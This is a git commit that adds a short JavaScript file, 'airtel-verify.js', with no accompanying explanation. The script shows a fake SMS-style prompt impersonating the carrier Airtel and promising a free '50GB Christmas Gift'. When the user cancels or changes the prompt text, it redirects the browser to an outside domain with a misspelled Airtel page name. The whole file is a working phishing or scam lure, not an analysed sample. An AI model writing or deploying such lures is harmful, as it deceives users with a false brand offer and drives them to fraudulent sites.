bf7af4a29979228bb71a22d914e18b3b3730e241
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-19 08:34:24 -0800

    Create airtel-verify.js

---
+++ airtel-verify.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for Airtel 50GB Christmas Gift, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://30gbbonus.xyz/airtlel-xmas.html';
+}
